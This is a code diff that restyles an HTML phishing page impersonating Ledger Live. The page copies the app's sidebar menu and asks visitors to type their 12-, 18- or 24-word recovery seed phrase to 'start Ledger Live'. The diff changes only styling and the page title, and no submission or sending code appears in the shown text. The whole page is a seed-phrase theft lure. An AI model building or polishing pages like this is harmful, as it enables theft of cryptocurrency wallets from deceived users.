@@ -3,152 +3,157 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify Seed Phrase</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <title>Verify Seed Phrase - Ledger Live</title>
   <style>
     body {
       margin: 0;
       padding: 0;
-      background-color: #111;
+      background-color: #121212;
       color: white;
-      font-family: 'Roboto Mono', monospace;
+      font-family: 'Courier New', monospace;
       display: flex;
       height: 100vh;
+      overflow: hidden;
     }
 
     /* Sidebar */
     .sidebar {
       width: 260px;
-      background-color: #1a1a1a;
+      background-color: #1e1e1e;
       padding: 20px;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
+      gap: 15px;
     }
 
     .logo {
       font-size: 20px;
       font-weight: bold;
-      letter-spacing: 2px;
-      margin-bottom: 40px;
+      margin-bottom: 30px;
     }
 
-    .menu a {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      text-decoration: none;
+    .menu-item {
       color: #ccc;
-      padding: 10px 0;
-      transition: 0.3s;
+      font-size: 15px;
+      padding: 10px;
+      border-radius: 6px;
+      transition: background 0.3s ease;
+      cursor: pointer;
     }
 
-    .menu a:hover {
-      color: white;
+    .menu-item:hover {
+      background-color: #292929;
+      color: #fff;
     }
 
-    .icon {
-      width: 18px;
-      height: 18px;
-      background-color: #666;
-      display: inline-block;
-      border-radius: 4px;
-    }
-
-    /* Main Content */
+    /* Main content */
     .main {
       flex: 1;
-      padding: 50px;
+      padding: 60px;
+      overflow-y: auto;
     }
 
     h1 {
       font-size: 28px;
-      letter-spacing: 1px;
+      letter-spacing: 2px;
     }
 
     p {
-      color: #aaa;
+      color: #ccc;
+      margin-top: 10px;
+      font-size: 14px;
     }
 
-    .word-selection {
-      margin: 20px 0;
+    .note {
+      font-weight: bold;
+      margin-top: 20px;
+      font-size: 14px;
     }
 
-    .word-selection button {
-      background-color: #5f4ce8;
+    /* Buttons for 12,18,24 words */
+    .word-options {
+      display: flex;
+      gap: 10px;
+      margin-top: 30px;
+    }
+
+    .word-options button {
+      background-color: #6d63ff;
       border: none;
-      padding: 8px 18px;
+      padding: 10px 20px;
       color: white;
-      font-weight: 600;
-      margin-right: 10px;
+      font-weight: bold;
       border-radius: 6px;
       cursor: pointer;
-      transition: 0.3s;
+      transition: background 0.3s;
     }
 
-    .word-selection button:hover {
-      background-color: #7a63ff;
+    .word-options button:hover {
+      background-color: #8a81ff;
     }
 
+    /* Input fields grid */
     .grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 15px;
-      margin-top: 20px;
+      margin-top: 30px;
+      max-width: 800px;
     }
 
     input {
-      background-color: #222;
-      border: 1px solid #444;
+      background-color: #1c1c1c;
+      border: 1px solid #333;
+      padding: 12px;
       border-radius: 6px;
-      padding: 10px;
       color: white;
-      width: 100%;
-      font-size: 15px;
+      font-size: 14px;
+      outline: none;
     }
 
+    input::placeholder {
+      color: #777;
+    }
+
+    /* Continue button */
     .continue-btn {
-      background-color: #5f4ce8;
+      margin-top: 40px;
+      background-color: #6d63ff;
       border: none;
-      border-radius: 8px;
-      padding: 10px 25px;
+      padding: 12px 30px;
       color: white;
-      font-size: 16px;
-      margin-top: 30px;
+      font-weight: bold;
+      font-size: 15px;
+      border-radius: 8px;
       cursor: pointer;
-      transition: 0.3s;
+      transition: background 0.3s ease;
     }
 
     .continue-btn:hover {
-      background-color: #7a63ff;
+      background-color: #8a81ff;
     }
   </style>
 </head>
 <body>
-
   <div class="sidebar">
-    <div>
-      <div class="logo">[ LEDGER-LIVE ]</div>
-      <div class="menu">
-        <a href="#"><div class="icon"></div> Portfolio</a>
-        <a href="#"><div class="icon"></div> Market</a>
-        <a href="#"><div class="icon"></div> Accounts</a>
-        <a href="#"><div class="icon"></div> Send</a>
-        <a href="#"><div class="icon"></div> Receive</a>
-        <a href="#"><div class="icon"></div> Buy/Sell</a>
-        <a href="#"><div class="icon"></div> Swap</a>
-        <a href="#"><div class="icon"></div> Manager</a>
-      </div>
-    </div>
+    <div class="logo">[ LEDGER-LIVE ]</div>
+    <div class="menu-item">Portfolio</div>
+    <div class="menu-item">Market</div>
+    <div class="menu-item">Accounts</div>
+    <div class="menu-item">Send</div>
+    <div class="menu-item">Receive</div>
+    <div class="menu-item">Buy/Sell</div>
+    <div class="menu-item">Swap</div>
+    <div class="menu-item">Manager</div>
   </div>
 
   <div class="main">
     <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
     <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
-    <p><b>**Ledger does not keep a copy of your recovery phrase.</b></p>
-    <p><b>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</b></p>
+    <p class="note">**Ledger does not keep a copy of your recovery phrase.</p>
+    <p class="note">**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
 
-    <div class="word-selection">
+    <div class="word-options">
       <button>12 Words</button>
       <button>18 Words</button>
       <button>24 Words</button>
@@ -171,6 +176,5 @@
 
     <button class="continue-btn">Continue...</button>
   </div>
-
 </body>
 </html>
